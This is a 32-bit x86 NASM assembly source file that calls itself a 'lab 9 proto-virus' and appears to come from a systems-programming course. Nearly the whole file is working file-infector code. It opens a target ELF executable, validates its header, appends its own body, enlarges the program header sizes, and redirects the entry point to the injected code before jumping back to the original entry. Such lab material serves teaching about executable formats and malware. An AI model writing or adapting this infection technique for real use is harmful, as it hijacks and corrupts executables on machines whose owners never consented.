%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8

%define VirusSize [ebp+192]
%define FD [ebp+188]
%define prevEntry [ebp+184]
%define SizeOfFile [ebp+180]

	global _start

	section .text
_start: 
	push ebp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	mov	ebp, esp
	
	call get_my_loc
	sub ecx, next_i-OutStr
    write 1, ecx, 31			; virus message

	call get_my_loc
	sub ecx, next_i-FileName
	mov FD, ecx

	open FD, RDWR, 0777 		; open ELF file
	cmp eax, 0
	jle ErrorExit				; check that file was opened correctly
	mov FD, eax 				; ebp-4 = fd

	lea ecx, [ebp]
	read FD, ecx, 52			; read to validate ELf to a "buffer" of 4 bytes at ebp-8
	
	cmp byte[ebp], 127
	jne notElf
	cmp byte[ebp+1], 'E'
	jne notElf
	cmp byte[ebp+2], 'L'
	jne notElf
	cmp byte[ebp+3], 'F'
	jne notElf

	mov dword VirusSize, virus_end - _start	; save virus size

	lseek FD, 0, 2				; lseek to end of file
	mov SizeOfFile, eax 		; save file size

	write FD, _start, VirusSize	;add the virus in the end of the file

	lea ecx, [ebp+ENTRY]		; ecx = point to entry point
	mov eax, [ecx]				; eax = entry point
	mov prevEntry, eax 			; addr = entry point

	; we got some help from a friend :)
	add ecx, 4					; ecx = start of PHDR
	mov ecx, [ecx]				; ecx = start of PHDR
	lseek FD, ecx, SEEK_SET		; move in file to start of PHDR
	
	lea ecx, [ebp+52]  	    	; ecx points to free space on stacl
	read FD, ecx, PHDR_size 	; read to stack first program hreader
	
	lea ecx, [ebp+PHDR_start]	; ecx point on entry point
	mov ecx, [ecx]				; eax = 52
	add ecx, PHDR_size 			; ecx point on the second program header (84)

	lseek FD, ecx, SEEK_SET		;
	lea ecx, [ebp+84]	;
	read FD, ecx, PHDR_size 	; read the second program file
	
	add ecx, PHDR_vaddr 		; go to v_addr of second
	mov eax, [ecx]				; eax = v_addr of second

	add eax, SizeOfFile			; eax = eax + file size
	sub ecx, 4					; ecx = offset of second PHDR
	sub eax, [ecx]				; eax = eax - offset
	lea ebx, [ebp+ENTRY]		; ebx = entry
	mov [ebx], eax 				; entry point = eax
	
	add ecx, 12					; ecx = PHDR_filesize
	mov edi, VirusSize
	add [ecx], edi
	add ecx, 4
	add [ecx], edi

	lseek FD,0,0
	lea ecx,[ebp]
	write FD, ecx, 116

	lseek FD, -4, SEEK_END
	lea ecx, prevEntry
	write FD, ecx, 4

	close FD

ErrorExit:
	call get_my_loc
	sub ecx, next_i-PreviousEntryPoint
	jmp [ecx]

notElf:
	call get_my_loc
	sub ecx,next_i-open_error
    write 1, ecx, 12

VirusExit:
    exit 0       

get_my_loc:
	call next_i

next_i:
	pop ecx
	ret



FileName:		db "ELFexec2long", 0
OutStr:			db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
infectionMSG: 	db "Hello, Infected File", 10     ;
check: 			db "this is a check", 10, 0
notAnELF:		db "this is not an elf file", 10, 0
newLine:		db "",10,0	
open_error:		db "Error opening the file", 10, 0

PreviousEntryPoint: dd VirusExit
virus_end: